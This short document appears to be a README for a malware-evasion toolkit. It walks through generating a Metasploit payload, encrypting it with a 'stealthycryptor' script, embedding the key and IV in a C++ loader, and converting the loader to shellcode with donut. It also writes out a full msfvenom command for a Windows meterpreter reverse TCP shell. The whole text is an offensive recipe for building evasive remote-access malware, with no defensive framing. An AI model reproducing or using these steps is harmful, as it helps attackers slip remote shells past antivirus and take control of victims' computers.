use an msfvenom payload then encrypt it with the stealthycryptor.py

you'll get the IV and key paste that into the stealthyloader4 c++ file and compile it.

Then put that on the kali server and run

donut -i Stealthyloader4.exe -a 2 -f 1 -o donut.bin -t -x 1 -b 3

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f raw -o payload.bin

